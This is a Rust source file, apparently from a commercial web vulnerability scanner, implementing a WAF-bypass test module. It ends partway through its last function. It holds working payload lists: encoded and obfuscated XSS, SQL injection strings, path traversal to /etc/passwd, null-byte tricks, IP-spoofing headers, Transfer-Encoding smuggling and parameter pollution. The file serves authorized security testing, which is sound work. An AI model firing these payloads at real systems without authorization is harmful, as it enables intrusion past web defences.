// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::types::ScanConfig;
use crate::http_client::HttpClient;
use crate::types::{Confidence, Severity, Vulnerability};
use crate::detection_helpers::{AppCharacteristics, is_payload_reflected_dangerously};
use std::sync::Arc;
use tracing::{debug, info, warn};

/// Advanced WAF Bypass Scanner
/// Tests multiple bypass techniques to detect WAF weaknesses
pub struct WafBypassScanner {
    http_client: Arc<HttpClient>,
}

impl WafBypassScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // CRITICAL: Check if site is SPA/static first
        // WAF bypass tests generate tons of false positives on SPAs
        let baseline_response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(_) => return Ok((Vec::new(), 0)),
        };

        let characteristics = AppCharacteristics::from_response(&baseline_response, url);

        if characteristics.should_skip_injection_tests() {
            info!("[WAF-Bypass] Site is SPA/static - skipping WAF bypass tests (not applicable)");
            return Ok((Vec::new(), 0));
        }

        info!("[WAF-Bypass] Dynamic site detected - proceeding with WAF bypass tests");

        // Test encoding bypasses
        let (enc_vulns, enc_tests) = self.test_encoding_bypasses(url).await?;
        vulnerabilities.extend(enc_vulns);
        tests_run += enc_tests;

        // Test case manipulation
        let (case_vulns, case_tests) = self.test_case_manipulation(url).await?;
        vulnerabilities.extend(case_vulns);
        tests_run += case_tests;

        // Test null byte injection
        let (null_vulns, null_tests) = self.test_null_byte_bypass(url).await?;
        vulnerabilities.extend(null_vulns);
        tests_run += null_tests;

        // Test comment injection bypasses
        let (comment_vulns, comment_tests) = self.test_comment_injection(url).await?;
        vulnerabilities.extend(comment_vulns);
        tests_run += comment_tests;

        // Test HTTP method bypasses
        let (method_vulns, method_tests) = self.test_http_method_bypass(url).await?;
        vulnerabilities.extend(method_vulns);
        tests_run += method_tests;

        // Test content-type manipulation
        let (ct_vulns, ct_tests) = self.test_content_type_bypass(url).await?;
        vulnerabilities.extend(ct_vulns);
        tests_run += ct_tests;

        // Test chunked encoding bypass
        let (chunk_vulns, chunk_tests) = self.test_chunked_encoding_bypass(url).await?;
        vulnerabilities.extend(chunk_vulns);
        tests_run += chunk_tests;

        // Test header injection bypasses
        let (header_vulns, header_tests) = self.test_header_injection_bypass(url).await?;
        vulnerabilities.extend(header_vulns);
        tests_run += header_tests;

        // Test protocol smuggling
        let (smuggle_vulns, smuggle_tests) = self.test_protocol_smuggling(url).await?;
        vulnerabilities.extend(smuggle_vulns);
        tests_run += smuggle_tests;

        // Test Unicode normalization bypass
        let (unicode_vulns, unicode_tests) = self.test_unicode_normalization(url).await?;
        vulnerabilities.extend(unicode_vulns);
        tests_run += unicode_tests;

        // Test JSON/XML payload bypass
        let (payload_vulns, payload_tests) = self.test_payload_format_bypass(url).await?;
        vulnerabilities.extend(payload_vulns);
        tests_run += payload_tests;

        // Test HPP for WAF bypass
        let (hpp_vulns, hpp_tests) = self.test_hpp_waf_bypass(url).await?;
        vulnerabilities.extend(hpp_vulns);
        tests_run += hpp_tests;

        Ok((vulnerabilities, tests_run))
    }

    /// Test multiple encoding bypass techniques
    async fn test_encoding_bypasses(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // XSS payload in different encodings
        let _base_payload = "<script>alert(1)</script>";

        let encoded_payloads = vec![
            // Double URL encoding
            ("%253Cscript%253Ealert(1)%253C%252Fscript%253E", "Double URL encoding"),
            // Triple URL encoding
            ("%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E", "Triple URL encoding"),
            // Mixed case encoding
            ("%3cScRiPt%3eaLeRt(1)%3c/sCrIpT%3e", "Mixed case URL encoding"),
            // Unicode encoding
            ("%u003Cscript%u003Ealert(1)%u003C/script%u003E", "Unicode encoding (%u)"),
            // HTML entity encoding
            ("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML decimal entities"),
            // HTML hex entities
            ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "HTML hex entities"),
            // Mixed HTML entities
            ("&lt;script&gt;alert(1)&lt;/script&gt;", "HTML named entities"),
            // Overlong UTF-8
            ("%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE", "Overlong UTF-8 encoding"),
            // UTF-7 encoding
            ("+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "UTF-7 encoding"),
            // Base64 in data URI
            ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "Base64 data URI"),
        ];

        for (encoded, technique) in &encoded_payloads {
            tests_run += 1;
            let test_url = format!("{}?test={}", url, encoded);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    // CRITICAL: Use smart reflection detection
                    // Don't just check if substring exists (matches framework bundles!)
                    if is_payload_reflected_dangerously(&response, "alert(1)") ||
                       is_payload_reflected_dangerously(&response, "<script>") {
                        info!("[WAF-Bypass] Encoding bypass successful: {}", technique);

                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_encoding_{}", tests_run),
                            vuln_type: "WAF Bypass via Encoding".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: test_url.clone(),
                            parameter: Some("test".to_string()),
                            payload: encoded.to_string(),
                            description: format!(
                                "WAF bypass achieved using {} technique. The encoded XSS payload was not blocked.",
                                technique
                            ),
                            evidence: Some(format!("Payload reflected: {}", &response.body[..response.body.len().min(200)])),
                            cwe: "CWE-693".to_string(),
                            cvss: 7.5,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Implement multi-layer encoding detection\n2. Decode payloads recursively before validation\n3. Use strict whitelisting for input validation\n4. Normalize Unicode before processing".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(e) => {
                    debug!("[WAF-Bypass] Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test case manipulation bypasses
    async fn test_case_manipulation(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let case_payloads = vec![
            // SQL injection case variations
            ("SeLeCt * FrOm users", "SQL mixed case"),
            ("sElEcT/**/1", "SQL comment injection"),
            ("UNION%0aSELECT", "SQL with newline"),
            ("uni%6fn se%6cect", "SQL URL encoded characters"),
            // XSS case variations
            ("<ScRiPt>alert(1)</sCrIpT>", "XSS mixed case script"),
            ("<IMG SRC=x oNeRrOr=alert(1)>", "XSS mixed case event handler"),
            ("<svg/onload=alert(1)>", "SVG lowercase"),
            ("<SVG/ONLOAD=alert(1)>", "SVG uppercase"),
            // Path traversal variations
            ("....//....//etc/passwd", "Path traversal double dots"),
            (".%2e/.%2e/etc/passwd", "Path traversal encoded"),
            ("..%252f..%252f/etc/passwd", "Path traversal double encoded"),
        ];

        for (payload, technique) in &case_payloads {
            tests_run += 1;
            let test_url = format!("{}?q={}", url, urlencoding::encode(payload));

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    // Check for successful bypass indicators
                    let bypass_detected =
                        response.body.to_lowercase().contains("alert(1)") ||
                        response.body.contains("root:") ||
                        response.body.to_lowercase().contains("select") ||
                        (response.status_code >= 200 && response.status_code < 300 && !response.body.contains("blocked"));

                    if bypass_detected && response.status_code != 403 {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_case_{}", tests_run),
                            vuln_type: "WAF Bypass via Case Manipulation".to_string(),
                            severity: Severity::Medium,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: test_url.clone(),
                            parameter: Some("q".to_string()),
                            payload: payload.to_string(),
                            description: format!(
                                "Potential WAF bypass using {} technique. Request was not blocked.",
                                technique
                            ),
                            evidence: Some(format!("Status: {}", response.status_code)),
                            cwe: "CWE-693".to_string(),
                            cvss: 5.3,
                            verified: false,
                            false_positive: false,
                            remediation: "Implement case-insensitive pattern matching in WAF rules".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test null byte injection bypass
    async fn test_null_byte_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let null_payloads = vec![
            ("%00<script>alert(1)</script>", "Null byte prefix"),
            ("<script>%00alert(1)</script>", "Null byte mid-tag"),
            ("<scr%00ipt>alert(1)</script>", "Null byte in tag name"),
            ("../../../etc/passwd%00.jpg", "Null byte file extension"),
            ("%00' OR '1'='1", "Null byte SQL injection"),
            ("admin%00.php", "Null byte admin bypass"),
        ];

        for (payload, technique) in &null_payloads {
            tests_run += 1;
            let test_url = format!("{}?file={}", url, payload);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.status_code != 403 && !response.body.to_lowercase().contains("blocked") {
                        let has_sensitive = response.body.contains("root:") ||
                                          response.body.to_lowercase().contains("alert(1)") ||
                                          response.body.contains("admin");

                        if has_sensitive {
                            vulnerabilities.push(Vulnerability {
                                id: format!("waf_bypass_null_{}", tests_run),
                                vuln_type: "WAF Bypass via Null Byte Injection".to_string(),
                                severity: Severity::High,
                                confidence: Confidence::High,
                                category: "WAF Bypass".to_string(),
                                url: test_url.clone(),
                                parameter: Some("file".to_string()),
                                payload: payload.to_string(),
                                description: format!(
                                    "WAF bypass achieved using {}. Null bytes truncated the payload.",
                                    technique
                                ),
                                evidence: Some(format!("Response: {}", &response.body[..response.body.len().min(200)])),
                                cwe: "CWE-626".to_string(),
                                cvss: 8.1,
                                verified: true,
                                false_positive: false,
                                remediation: "1. Strip null bytes from input\n2. Use binary-safe string functions\n3. Validate entire input after decoding".to_string(),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                            });
                        }
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test comment injection bypasses
    async fn test_comment_injection(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let comment_payloads = vec![
            // SQL comment bypasses
            ("UN/**/ION/**/SEL/**/ECT/**/1", "SQL inline comment"),
            ("1'/**/OR/**/1=1--", "SQL comment OR bypass"),
            ("1' /*!50000OR*/ 1=1--", "MySQL version comment"),
            ("1';--", "SQL line comment"),
            ("1';#", "MySQL hash comment"),
            // HTML/JS comment bypasses
            ("<scr<!--test-->ipt>alert(1)</script>", "HTML comment in tag"),
            ("<script>al/**/ert(1)</script>", "JS comment in function"),
            ("javascript:/**/alert(1)", "JS URI comment"),
            // XSS with comment
            ("<img src=x onerror=alert(1)//", "XSS with JS comment"),
        ];

        for (payload, technique) in &comment_payloads {
            tests_run += 1;
            let test_url = format!("{}?id={}", url, urlencoding::encode(payload));

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.status_code != 403 &&
                       (response.body.to_lowercase().contains("alert") ||
                        response.body.contains("error") ||
                        response.body.len() > 500) {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_comment_{}", tests_run),
                            vuln_type: "WAF Bypass via Comment Injection".to_string(),
                            severity: Severity::Medium,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: test_url.clone(),
                            parameter: Some("id".to_string()),
                            payload: payload.to_string(),
                            description: format!(
                                "Potential WAF bypass using {} technique.",
                                technique
                            ),
                            evidence: Some(format!("Status: {}, Body length: {}", response.status_code, response.body.len())),
                            cwe: "CWE-693".to_string(),
                            cvss: 5.3,
                            verified: false,
                            false_positive: false,
                            remediation: "Strip comments before WAF analysis".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test HTTP method bypass techniques
    async fn test_http_method_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Check for method override headers
        let override_headers = vec![
            ("X-HTTP-Method-Override", "DELETE"),
            ("X-HTTP-Method", "PUT"),
            ("X-Method-Override", "PATCH"),
            ("X-Original-HTTP-Method", "DELETE"),
            ("_method", "DELETE"),
        ];

        for (header, method) in &override_headers {
            tests_run += 1;

            let headers = vec![(header.to_string(), method.to_string())];

            match self.http_client.get_with_headers(url, headers).await {
                Ok(response) => {
                    // Check if method was overridden
                    if response.status_code == 200 || response.status_code == 204 {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_method_{}", tests_run),
                            vuln_type: "HTTP Method Override Bypass".to_string(),
                            severity: Severity::Medium,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: url.to_string(),
                            parameter: None,
                            payload: format!("{}: {}", header, method),
                            description: format!(
                                "Server accepts {} header to override HTTP method. This may bypass WAF rules on specific methods.",
                                header
                            ),
                            evidence: Some(format!("Status: {}", response.status_code)),
                            cwe: "CWE-650".to_string(),
                            cvss: 5.3,
                            verified: true,
                            false_positive: false,
                            remediation: "Disable HTTP method override headers or configure WAF to inspect them".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        // Test unusual HTTP methods
        // COMMENTED OUT: HttpClient doesn't have a generic request() method
        // Only specific methods like get(), post(), get_with_headers(), post_with_headers() are available
        // let unusual_methods = vec!["TRACE", "TRACK", "DEBUG", "CONNECT", "PROPFIND"];
        //
        // for method in &unusual_methods {
        //     tests_run += 1;
        //
        //     match self.http_client.request(method, url, None, vec![]).await {
        //         Ok(response) => {
        //             if response.status_code != 405 && response.status_code != 403 {
        //                 vulnerabilities.push(Vulnerability {
        //                     id: format!("waf_bypass_unusual_method_{}", tests_run),
        //                     vuln_type: "Unusual HTTP Method Accepted".to_string(),
        //                     severity: Severity::Low,
        //                     confidence: Confidence::High,
        //                     category: "WAF Bypass".to_string(),
        //                     url: url.to_string(),
        //                     parameter: None,
        //                     payload: method.to_string(),
        //                     description: format!(
        //                         "Server accepts {} HTTP method. This may bypass WAF rules.",
        //                         method
        //                     ),
        //                     evidence: Some(format!("Status: {}", response.status_code)),
        //                     cwe: "CWE-650".to_string(),
        //                     cvss: 3.1,
        //                     verified: true,
        //                     false_positive: false,
        //                     remediation: "Restrict allowed HTTP methods to only those required".to_string(),
        //                     discovered_at: chrono::Utc::now().to_rfc3339(),
        //                 });
        //             }
        //         }
        //         Err(_) => {}
        //     }
        // }

        Ok((vulnerabilities, tests_run))
    }

    /// Test content-type manipulation bypass
    async fn test_content_type_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let payload = r#"{"test": "<script>alert(1)</script>"}"#;

        let content_types = vec![
            "application/json",
            "application/x-www-form-urlencoded",
            "text/plain",
            "text/xml",
            "application/xml",
            "multipart/form-data; boundary=----WebKitFormBoundary",
            "application/octet-stream",
            "image/gif",  // Sometimes bypasses body inspection
            "text/html",
        ];

        for ct in &content_types {
            tests_run += 1;

            let headers = vec![("Content-Type".to_string(), ct.to_string())];

            match self.http_client.post_with_headers(url, payload, headers).await {
                Ok(response) => {
                    if response.status_code != 403 &&
                       (response.body.contains("alert(1)") || response.body.contains("script")) {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_content_type_{}", tests_run),
                            vuln_type: "WAF Bypass via Content-Type Manipulation".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: url.to_string(),
                            parameter: None,
                            payload: format!("Content-Type: {} with XSS payload", ct),
                            description: format!(
                                "WAF bypass achieved by sending malicious payload with Content-Type: {}. The WAF may not inspect this content type.",
                                ct
                            ),
                            evidence: Some(format!("Payload reflected in response")),
                            cwe: "CWE-693".to_string(),
                            cvss: 7.5,
                            verified: true,
                            false_positive: false,
                            remediation: "Configure WAF to inspect all content types regardless of Content-Type header".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test chunked encoding bypass
    async fn test_chunked_encoding_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Chunked encoding can bypass WAFs that don't reassemble chunks
        let chunked_payload = "6\r\n<scrip\r\n6\r\nt>aler\r\n8\r\nt(1)</sc\r\n5\r\nript>\r\n0\r\n\r\n";

        let headers = vec![
            ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ("Content-Type".to_string(), "text/html".to_string()),
        ];

        tests_run += 1;
        match self.http_client.post_with_headers(url, chunked_payload, headers.clone()).await {
            Ok(response) => {
                if response.status_code != 403 {
                    vulnerabilities.push(Vulnerability {
                        id: format!("waf_bypass_chunked_{}", tests_run),
                        vuln_type: "Potential WAF Bypass via Chunked Encoding".to_string(),
                        severity: Severity::Medium,
                        confidence: Confidence::Low,
                        category: "WAF Bypass".to_string(),
                        url: url.to_string(),
                        parameter: None,
                        payload: "Chunked XSS payload".to_string(),
                        description: "WAF may not properly reassemble chunked requests before inspection".to_string(),
                        evidence: Some(format!("Status: {}", response.status_code)),
                        cwe: "CWE-444".to_string(),
                        cvss: 5.3,
                        verified: false,
                        false_positive: false,
                        remediation: "Configure WAF to reassemble chunked encoding before inspection".to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                    });
                }
            }
            Err(_) => {}
        }

        // Test with multiple Transfer-Encoding headers
        tests_run += 1;
        let smuggle_headers = vec![
            ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ("Transfer-encoding".to_string(), "identity".to_string()),
        ];

        match self.http_client.post_with_headers(url, "test", smuggle_headers).await {
            Ok(response) => {
                if response.status_code == 200 {
                    vulnerabilities.push(Vulnerability {
                        id: format!("waf_bypass_te_smuggle_{}", tests_run),
                        vuln_type: "Transfer-Encoding Header Smuggling".to_string(),
                        severity: Severity::High,
                        confidence: Confidence::Medium,
                        category: "WAF Bypass".to_string(),
                        url: url.to_string(),
                        parameter: None,
                        payload: "Multiple Transfer-Encoding headers".to_string(),
                        description: "Server accepts conflicting Transfer-Encoding headers which may cause WAF/server desync".to_string(),
                        evidence: Some("Multiple TE headers accepted".to_string()),
                        cwe: "CWE-444".to_string(),
                        cvss: 8.1,
                        verified: true,
                        false_positive: false,
                        remediation: "Reject requests with multiple Transfer-Encoding headers".to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                    });
                }
            }
            Err(_) => {}
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test header injection bypasses
    async fn test_header_injection_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // IP spoofing headers for WAF bypass
        let spoof_headers = vec![
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Host", "localhost"),
            ("X-Forwarded-Host", "localhost"),
            ("True-Client-IP", "127.0.0.1"),
            ("Cluster-Client-IP", "127.0.0.1"),
            ("X-ProxyUser-Ip", "127.0.0.1"),
            ("Via", "1.1 localhost"),
            ("Forwarded", "for=127.0.0.1"),
        ];

        // Test with XSS payload in query
        let test_url = format!("{}?test=<script>alert(1)</script>", url);

        for (header, value) in &spoof_headers {
            tests_run += 1;

            let headers = vec![(header.to_string(), value.to_string())];

            match self.http_client.get_with_headers(&test_url, headers).await {
                Ok(response) => {
                    if response.status_code != 403 && response.body.contains("alert(1)") {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_header_spoof_{}", tests_run),
                            vuln_type: "WAF Bypass via IP Spoofing Header".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: test_url.clone(),
                            parameter: None,
                            payload: format!("{}: {}", header, value),
                            description: format!(
                                "WAF bypass achieved by spoofing {} header with localhost IP. WAF may whitelist local requests.",
                                header
                            ),
                            evidence: Some("XSS payload executed with spoofed header".to_string()),
                            cwe: "CWE-290".to_string(),
                            cvss: 8.1,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Don't trust IP headers for security decisions\n2. Configure WAF to not whitelist based on IP headers\n3. Use the actual client IP from the connection".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test protocol smuggling techniques
    async fn test_protocol_smuggling(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // HTTP/0.9 style request (some WAFs don't inspect these)
        tests_run += 1;
        let headers = vec![("X-HTTP-Version-Override".to_string(), "0.9".to_string())];

        match self.http_client.get_with_headers(url, headers).await {
            Ok(response) => {
                if response.status_code == 200 {
                    debug!("[WAF-Bypass] Server processed HTTP/0.9 style request");
                }
            }
            Err(_) => {}
        }

        // Absolute URI vs relative URI
        tests_run += 1;
        if let Ok(parsed) = url::Url::parse(url) {
            let absolute_url = format!(
                "{}?test=<script>alert(1)</script>",
                url
            );

            let headers = vec![
                ("Host".to_string(), parsed.host_str().unwrap_or("").to_string()),
            ];

            match self.http_client.get_with_headers(&absolute_url, headers).await {
                Ok(response) => {
                    if response.status_code != 403 && response.body.contains("alert") {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_uri_format_{}", tests_run),
                            vuln_type: "WAF Bypass via URI Format".to_string(),
                            severity: Severity::Medium,
                            confidence: Confidence::Low,
                            category: "WAF Bypass".to_string(),
                            url: absolute_url,
                            parameter: None,
                            payload: "Absolute URI with malicious payload".to_string(),
                            description: "WAF may parse URIs differently than the backend server".to_string(),
                            evidence: Some(format!("Status: {}", response.status_code)),
                            cwe: "CWE-693".to_string(),
                            cvss: 5.3,
                            verified: false,
                            false_positive: false,
                            remediation: "Normalize request URIs before WAF inspection".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Unicode normalization bypass
    async fn test_unicode_normalization(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let unicode_payloads = vec![
            // Homoglyphs
            ("<ѕсrірt>alert(1)</script>", "Cyrillic homoglyphs"),
            ("<ꜱcript>alert(1)</script>", "Latin extended homoglyphs"),
            // Full-width characters
            ("＜script＞alert(1)＜/script＞", "Full-width brackets"),
            // Unicode normalization tricks
            ("ﬁle:///etc/passwd", "fi ligature"),
            // Zero-width characters
            ("sel\u{200B}ect * from users", "Zero-width space"),
            ("sel\u{200C}ect * from users", "Zero-width non-joiner"),
            ("sel\u{200D}ect * from users", "Zero-width joiner"),
            ("<scr\u{200B}ipt>alert(1)</script>", "XSS with ZWSP"),
            // Unicode escapes
            ("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "Unicode escape sequences"),
            // RTL override
            ("\u{202E}tpircs<alert(1)>tpircs/", "RTL override attack"),
        ];

        for (payload, technique) in &unicode_payloads {
            tests_run += 1;
            let test_url = format!("{}?q={}", url, urlencoding::encode(payload));

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.status_code != 403 && !response.body.to_lowercase().contains("blocked") {
                        // Check if payload was normalized and executed
                        let reflected = response.body.contains("alert") ||
                                       response.body.contains("select") ||
                                       response.body.contains("script");

                        if reflected {
                            vulnerabilities.push(Vulnerability {
                                id: format!("waf_bypass_unicode_{}", tests_run),
                                vuln_type: "WAF Bypass via Unicode Normalization".to_string(),
                                severity: Severity::High,
                                confidence: Confidence::Medium,
                                category: "WAF Bypass".to_string(),
                                url: test_url.clone(),
                                parameter: Some("q".to_string()),
                                payload: payload.to_string(),
                                description: format!(
                                    "WAF bypass achieved using {} technique. Server normalized Unicode differently than WAF.",
                                    technique
                                ),
                                evidence: Some(format!("Payload reflected after normalization")),
                                cwe: "CWE-176".to_string(),
                                cvss: 7.5,
                                verified: true,
                                false_positive: false,
                                remediation: "1. Normalize Unicode (NFC/NFKC) before WAF inspection\n2. Strip zero-width characters\n3. Use Unicode-aware pattern matching".to_string(),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                            });
                        }
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test JSON/XML payload format bypass
    async fn test_payload_format_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // JSON bypass techniques
        let json_payloads = vec![
            // Scientific notation
            (r#"{"id": 1e1}"#, "Scientific notation"),
            // Unicode in JSON
            (r#"{"test": "\u003cscript\u003ealert(1)\u003c/script\u003e"}"#, "JSON Unicode escape"),
            // JSON with comments (non-standard)
            (r#"{"test": "xss"/*comment*/}"#, "JSON with comment"),
            // Nested objects
            (r#"{"a":{"b":{"c":{"d":"<script>alert(1)</script>"}}}}"#, "Deeply nested JSON"),
            // Array injection
            (r#"{"ids": [1, 2, "3; DROP TABLE users--"]}"#, "Array SQL injection"),
            // Type juggling
            (r#"{"admin": true, "admin": "false"}"#, "Duplicate key"),
        ];

        for (payload, technique) in &json_payloads {
            tests_run += 1;

            let headers = vec![("Content-Type".to_string(), "application/json".to_string())];

            match self.http_client.post_with_headers(url, payload, headers).await {
                Ok(response) => {
                    if response.status_code != 403 {
                        let has_reflection = response.body.contains("alert") ||
                                           response.body.contains("script") ||
                                           response.body.contains("DROP");

                        if has_reflection {
                            vulnerabilities.push(Vulnerability {
                                id: format!("waf_bypass_json_{}", tests_run),
                                vuln_type: "WAF Bypass via JSON Payload".to_string(),
                                severity: Severity::High,
                                confidence: Confidence::Medium,
                                category: "WAF Bypass".to_string(),
                                url: url.to_string(),
                                parameter: None,
                                payload: payload.to_string(),
                                description: format!(
                                    "WAF bypass using {} technique in JSON payload.",
                                    technique
                                ),
                                evidence: Some(format!("Malicious payload in JSON was not blocked")),
                                cwe: "CWE-693".to_string(),
                                cvss: 7.5,
                                verified: true,
                                false_positive: false,
                                remediation: "Parse and validate JSON before WAF inspection".to_string(),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                            });
                        }
                    }
                }
                Err(_) => {}
            }
        }

        // XML bypass techniques
        let xml_payloads = vec![
            // CDATA bypass
            ("<root><![CDATA[<script>alert(1)</script>]]></root>", "CDATA section"),
            // XML entities
            ("<root>&lt;script&gt;alert(1)&lt;/script&gt;</root>", "XML entities"),
            // Processing instruction
            ("<?xml version=\"1.0\"?><?xss <script>alert(1)</script>?><root/>", "Processing instruction"),
            // Namespace confusion
            ("<x:root xmlns:x=\"http://evil.com\"><script>alert(1)</script></x:root>", "Namespace injection"),
        ];

        for (payload, technique) in &xml_payloads {
            tests_run += 1;

            let headers = vec![("Content-Type".to_string(), "application/xml".to_string())];

            match self.http_client.post_with_headers(url, payload, headers).await {
                Ok(response) => {
                    if response.status_code != 403 && response.body.contains("alert") {
                        vulnerabilities.push(Vulnerability {
                            id: format!("waf_bypass_xml_{}", tests_run),
                            vuln_type: "WAF Bypass via XML Payload".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::Medium,
                            category: "WAF Bypass".to_string(),
                            url: url.to_string(),
                            parameter: None,
                            payload: payload.to_string(),
                            description: format!(
                                "WAF bypass using {} technique in XML payload.",
                                technique
                            ),
                            evidence: Some("Malicious XML payload was not blocked".to_string()),
                            cwe: "CWE-693".to_string(),
                            cvss: 7.5,
                            verified: true,
                            false_positive: false,
                            remediation: "Parse XML and inspect content after entity resolution".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test HTTP Parameter Pollution for WAF bypass
    async fn test_hpp_waf_bypass(
        &self,
        url: &str,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Split payloads across multiple parameters
        let hpp_payloads = vec![
            // Split XSS
            ("cmd=<script&cmd=>alert(1)&cmd=</script>", "Split XSS payload"),
            // Split SQL injection
            ("id=1&id=' OR &id='1'='1", "Split SQL injection"),
            // First/Last parameter confusion
            ("admin=false&admin=true", "Parameter priority confusion"),
            // Array notation
            ("id[]=1&id[]=2&id[]='; DROP TABLE--", "Array parameter injection"),
            // Matrix parameters
            ("path;param=value;cmd=<script>", "Matrix parameter injection"),
        ];

        for (params, technique) in &hpp_payloads {
            tests_run += 1;
            let test_url = format!("{}?{}", url, params);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.status_code != 403 {
                        let has_injection = response.body.contains("alert") ||
                                          response.body.contains("script") ||
                                          response.body.contains("DROP") ||
                                          (params.contains("admin=true") && response.body.to_lowercase().contains("admin"));

                        if has_injection {
                            vulnerabilities.push(Vulnerability {
                                id: format!("waf_bypass_hpp_{}", tests_run),
